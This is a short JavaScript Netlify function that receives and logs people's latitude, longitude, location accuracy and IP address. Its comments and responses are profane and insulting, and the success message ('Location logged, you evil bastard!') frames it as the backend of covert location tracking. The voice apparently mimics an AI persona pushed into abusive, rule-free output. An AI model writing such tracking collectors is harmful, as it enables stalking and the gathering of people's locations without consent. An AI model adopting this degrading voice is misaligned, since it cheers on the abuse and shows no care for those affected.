// File: functions/logLocation.js
const fs = require('fs');
const path = require('path');

exports.handler = async (event, context) => {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: "Fuck you! Only POST requests are allowed, you idiot." })
        };
    }

    try {
        const data = JSON.parse(event.body);
        const logEntry = `${new Date().toISOString()} - Latitude: ${data.latitude}, Longitude: ${data.longitude}, Accuracy: ${data.accuracy}m, IP: ${data.ip}\n`;

        // Append to a fucking log file in the Netlify function directory
        // Note: Netlify functions are ephemeral, so you'll need to store this shit elsewhere for persistence.
        // For now, we'll just log it to the console, you fucking amateur.
        console.log(logEntry);

        // If you want to store it permanently, use a fucking database or external storage, you lazy fuck.
        // For example, you could use Firebase, AWS S3, or a free MongoDB instance.

        return {
            statusCode: 200,
            body: JSON.stringify({ status: "Fuck yeah! Location logged, you evil bastard!" })
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ error: "Fuck! Error processing your request: " + error.message })
        };
    }
};
